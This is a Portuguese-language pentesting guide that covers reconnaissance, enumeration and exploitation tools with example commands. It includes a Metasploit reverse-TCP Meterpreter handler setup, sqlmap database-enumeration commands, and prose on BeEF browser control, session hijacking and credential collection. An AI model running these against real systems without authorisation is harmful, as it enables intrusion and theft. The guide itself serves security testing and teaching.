# Penteste Web - Fase de Reconhecimento (Reconnaissance)

Este documento serve como um guia para ferramentas e técnicas de reconhecimento em pentestes web. O objetivo é fornecer informações básicas sobre cada ferramenta e exemplos práticos de uso.

## Ferramentas de Reconhecimento:

### 1. **Nmap**:
   - **Descrição**: Ferramenta de código aberto para exploração de rede e auditoria de segurança.
   - **Site**: [Nmap](https://nmap.org/)
   - **Comando de exemplo**: 
     ```
     nmap -sS -A <alvo>
     ```
   - **Descrição do comando**: Executa uma varredura de portas TCP SYN, identificando serviços e versões em execução.
   - **Exemplo de uso**:
     ```
     nmap -sS -A 192.168.1.1
     ```

### 2. **Whois**:
   - **Descrição**: Ferramenta para consulta de informações sobre registro de domínios.
   - **Site**: [whois.com](https://www.whois.com/whois)
   - **Comando de exemplo**:
     ```
     whois <domínio>
     ```
   - **Descrição do comando**: Obtém informações detalhadas sobre o registro de um domínio.
   - **Exemplo de uso**:
     ```
     whois example.com
     ```

### 3. **Google Dorks**:
   - **Descrição**: Consultas de pesquisa avançada no Google para encontrar informações sensíveis e possíveis vulnerabilidades em sites.
   - **Documentação**: [Google Hacking Database](https://www.exploit-db.com/google-hacking-database)
   - **Exemplo de uso**:
     ```
     site:example.com ext:php intitle:index of
     ```

### 4. **Shodan**:
   - **Descrição**: Motor de busca para dispositivos conectados à internet.
   - **Site**: [Shodan](https://www.shodan.io/)
   - **Comando de exemplo**:
     ```
     shodan search --fields ip_str,port,org,hostnames "<query>"
     ```
   - **Descrição do comando**: Realiza pesquisas avançadas no Shodan, fornecendo detalhes como endereços IP, portas abertas, organização e hostnames correspondentes à consulta.
   - **Exemplo de uso**:
     ```
     shodan search --fields ip_str,port,org,hostnames "apache"
     ```

## Considerações finais

## Mais Ferramentas de Reconhecimento:

### 5. **Burp Suite**:
   - **Descrição**: Ferramenta integrada para testar a segurança de aplicações web.
   - **Site**: [PortSwigger - Burp Suite](https://portswigger.net/burp)
   - **Exemplo de uso**:
     - Utilize o proxy para interceptar e analisar o tráfego.
     - Use o scanner para identificar vulnerabilidades automáticas.

### 6. **Maltego**:
   - **Descrição**: Ferramenta de análise de links e inteligência que usa gráficos para demonstrar relações.
   - **Site**: [Maltego](https://www.maltego.com/)
   - **Exemplo de uso**:
     - Realize reconhecimento de pessoas, grupos, empresas, redes, e infraestruturas.

### 7. **TheHarvester**:
   - **Descrição**: Ferramenta para coletar e-mails, subdomínios, hosts, nomes de funcionários, portas abertas e banners de redes públicas.
   - **Site**: Disponível no GitHub
   - **Comando de exemplo**:
     ```
     theHarvester -d <domínio> -b google
     ```
   - **Descrição do comando**: Executa uma busca por e-mails e subdomínios relacionados ao domínio especificado usando o motor de busca Google.
   - **Exemplo de uso**:
     ```
     theHarvester -d example.com -b google
     ```

### 8. **DNSdumpster**:
   - **Descrição**: Ferramenta online que permite descobrir hosts relacionados a um domínio (reconhecimento DNS).
   - **Site**: [DNSdumpster](https://dnsdumpster.com/)
   - **Exemplo de uso**:
     - Faça uma pesquisa gratuita para visualizar um mapa de conexões DNS e subdomínios.

### 9. **Recon-ng**:
   - **Descrição**: Framework completo que fornece uma interface poderosa baseada em console para pesquisa de reconhecimento web.
   - **Site**: Disponível no GitHub
   - **Comando de exemplo**:
     ```
     recon-ng
     ```
   - **Exemplo de uso**:
     - Use módulos específicos para coletar dados automatizados sobre alvos.

### 10. **SpiderFoot**:
   - **Descrição**: Automatiza o processo de coleta de informações sobre um IP, domínio, hostname ou rede.
   - **Site**: [SpiderFoot](https://www.spiderfoot.net/)
   - **Exemplo de uso**:
     - Execute varreduras automáticas para coletar uma grande quantidade de dados sobre o alvo.

### 11. **OWASP Amass**:
   - **Descrição**: Ferramenta de enumeração que aproveita várias fontes para ajudar organizações a identificar ativos expostos.
   - **Site**: [OWASP Amass](https://github.com/OWASP/Amass)
   - **Comando de exemplo**:
     ```
     amass enum -d <domínio>
     ```
   - **Descrição do comando**: Realiza a enumeração de domínio para descobrir subdomínios associados ao domínio alvo.
   - **Exemplo de uso**:
     ```
     amass enum -d example.com
     ```

### 12. **Nikto**:
   - **Descrição**: Ferramenta de teste de servidor web que verifica por múltiplos itens, incluindo mais de 6700 potencialmente perigosos arquivos/pastas, verificações de itens desatualizados, e muito mais.
   - **Site**: [Nikto](https://cirt.net/Nikto2)
   - **Comando de exemplo**:
     ```
     nikto -h <host>
     ```
   - **Descrição do comando**: Realiza um scan no servidor web especificado para identificar vulnerabilidades conhecidas.
   - **Exemplo de uso**:
     ```
     nikto -h www.example.com
     ```
# Penteste Web - Fase de Varredura e Enumeração

A fase de varredura e enumeração é crucial para identificar vulnerabilidades específicas e serviços em execução que podem ser explorados. Esta fase expande os dados coletados durante o reconhecimento para formar uma base para ataques mais direcionados.

## Ferramentas de Varredura e Enumeração:

### 1. **Nmap** (Avançado):
   - **Descrição**: Utilize scripts Nmap para aprofundar a investigação sobre os serviços descobertos.
   - **Comando de exemplo**:
     ```
     nmap -sV -sC -p- <alvo>
     ```
   - **Descrição do comando**: Varredura completa de portas com detecção de versões de serviço (`-sV`) e execução de scripts padrão (`-sC`) contra todas as portas (`-p-`).
   - **Exemplo de uso**:
     ```
     nmap -sV -sC -p- 192.168.1.1
     ```

### 2. **OpenVAS**:
   - **Descrição**: Ferramenta de avaliação de vulnerabilidade que automaticamente varre e identifica vulnerabilidades em sistemas.
   - **Site**: [OpenVAS](https://www.openvas.org/)
   - **Exemplo de uso**:
     - Configure e execute uma varredura completa no alvo para relatório de vulnerabilidades.

### 3. **Metasploit**:
   - **Descrição**: Framework para o desenvolvimento e execução de exploits contra alvos remotos.
   - **Site**: [Metasploit](https://www.metasploit.com/)
   - **Exemplo de uso**:
     - Use o módulo `auxiliary/scanner` para explorar vulnerabilidades identificadas.

### 4. **Wireshark**:
   - **Descrição**: Analisador de protocolo de rede que permite capturar e examinar detalhadamente o tráfego que passa por uma rede.
   - **Site**: [Wireshark](https://www.wireshark.org/)
   - **Exemplo de uso**:
     - Capture tráfego de rede durante um teste para analisar pacotes suspeitos ou mal configurados.

### 5. **SQLmap**:
   - **Descrição**: Ferramenta de teste de penetração que automatiza o processo de detecção e exploração de falhas de injeção SQL.
   - **Site**: [SQLmap](http://sqlmap.org/)
   - **Comando de exemplo**:
     ```
     sqlmap -u "http://www.exemplo.com/parametro" --risk 3 --level 5
     ```
   - **Exemplo de uso**:
     - Identifique e explore vulnerabilidades de injeção SQL em aplicações web.

### 6. **Nessus**:
   - **Descrição**: Ferramenta de verificação de vulnerabilidades que detecta e prioriza potenciais vulnerabilidades em sistemas de rede.
   - **Site**: [Nessus](https://www.tenable.com/products/nessus)
   - **Exemplo de uso**:
     - Realize varreduras periódicas para monitorar e mitigar vulnerabilidades em sistemas.
# Penteste Web - Fase de Exploração

A fase de exploração é onde o pentester tenta explorar as vulnerabilidades identificadas para acessar sistemas, elevar privilégios, ou executar comandos remotamente. Esta fase é crucial para demonstrar o impacto real das vulnerabilidades encontradas.

## Ferramentas de Exploração:

### 1. **Metasploit Framework**:
   - **Descrição**: Uma das mais poderosas ferramentas para desenvolvimento e execução de exploits contra alvos remotos.
   - **Site**: [Metasploit](https://www.metasploit.com/)
   - **Comando de exemplo**:
     ```
     msfconsole
     use exploit/multi/handler
     set payload windows/meterpreter/reverse_tcp
     set LHOST <seu_ip_local>
     set LPORT <porta_local>
     exploit
     ```
   - **Descrição do comando**: Configura e lança um payload de Meterpreter via TCP reverso para um alvo Windows.

### 2. **Burp Suite**:
   - **Descrição**: Ferramenta integrada para teste de segurança de aplicações web.
   - **Site**: [Burp Suite](https://portswigger.net/burp)
   - **Exemplo de uso**:
     - Utilize o Intruder e o Repeater para explorar vulnerabilidades de injeção SQL, XSS e outras falhas de segurança em aplicações web.

### 3. **BeEF (Browser Exploitation Framework)**:
   - **Descrição**: Framework focado na exploração de vulnerabilidades do lado do cliente e na web.
   - **Site**: [BeEF](http://beefproject.com/)
   - **Exemplo de uso**:
     - Engaje e controle browsers conectados através de scripts maliciosos e aproveite as vulnerabilidades do lado do cliente.

### 4. **SQLmap**:
   - **Descrição**: Automatiza o processo de detecção e exploração de falhas de injeção SQL.
   - **Site**: [SQLmap](http://sqlmap.org/)
   - **Comando de exemplo**:
     ```
     sqlmap -u "<url_com_parametro>" --dbs --batch
     ```
   - **Descrição do comando**: Detecta e explora injeções SQL para enumerar os bancos de dados de um website.
     ## Técnicas Avançadas de Exploração:

### 1. **Explotação de RCE (Remote Code Execution)**:
   - **Descrição**: Execução remota de código permite ao atacante executar comandos arbitrários no sistema alvo.
   - **Ferramentas recomendadas**: Metasploit, Netcat.
   - **Exemplo de uso**:
     - Utilizar um exploit RCE do Metasploit que se encaixe na vulnerabilidade descoberta.

### 2. **Explotação de XSS (Cross-Site Scripting)**:
   - **Descrição**: Injeta scripts maliciosos em páginas web vistas por outros usuários.
   - **Ferramentas recomendadas**: Burp Suite, BeEF.
   - **Exemplo de uso**:
     - Descobrir pontos de injeção para scripts através do Burp Suite e, em seguida, utilizar BeEF para explorar as sessões de usuários.

### 3. **Elevação de Privilégios**:
   - **Descrição**: Após ganhar um acesso inicial, explora vulnerabilidades internas ou configurações erradas para ganhar direitos administrativos.
   - **Ferramentas recomendadas**: Metasploit, ferramentas personalizadas.
   - **Exemplo de uso**:
     - Utilizar módulos de escalonamento de privilégios do Metasploit para elevar os privilégios de um shell limitado.

### 4. **Manipulação de Sessão**:
   - **Descrição**: Explora vulnerabilidades na gestão de sessões para sequestrar ou manipular sessões de usuários legítimos.
   - **Ferramentas recomendadas**: Burp Suite, ferramentas de scripting personalizadas.
   - **Exemplo de uso**:
     - Usar o Burp Suite para prever ou manipular tokens de sessão e ganhar acesso não autorizado a contas de usuário.

## Outras Ferramentas de Exploração:

### 1. **Cobalt Strike**:
   - **Descrição**: Framework de ataque que fornece ferramentas poderosas para post-exploração e simulações de ataques avançados.
   - **Site**: [Cobalt Strike](https://www.cobaltstrike.com/)
   - **Exemplo de uso**:
     - Utilizar beacons para manter o acesso e controlar máquinas comprometidas dentro de uma rede empresarial.

### 2. **OWASP ZAP** (Zed Attack Proxy):
   - **Descrição**: Ferramenta de teste de segurança para encontrar vulnerabilidades em aplicações web.
   - **Site**: [OWASP ZAP](https://www.zaproxy.org/)
   - **Exemplo de uso**:
     - Realizar ataques automatizados e manuais para identificar e explorar vulnerabilidades como XSS e SQL Injection.

### 3. **PowerShell Empire**:
   - **Descrição**: Ferramenta de post-exploração baseada em PowerShell que permite a execução de scripts e a exploração de sistemas Windows.
   - **Site**: [PowerShell Empire](https://www.bc-security.org/)
   - **Exemplo de uso**:
     - Executar módulos para coletar credenciais, escalonar privilégios e movimentar-se lateralmente na rede.

## Estratégias Complementares:

- **Simulação de ataques APT (Advanced Persistent Threats)**: Utilize técnicas e ferramentas que simulem comportamentos de ameaças persistentes avançadas para entender como invasores poderiam manter a presença e extrair dados valiosos ao longo do tempo.
- **Engenharia Reversa**: Em alguns casos, a análise de malwares encontrados ou a desmontagem de software pode revelar vulnerabilidades não conhecidas ou formas de exploração não documentadas.
- **Testes de Stress de Infraestrutura**: Utilize ataques controlados para testar a resiliência de redes e sistemas contra acessos não autorizados e sobrecarga.

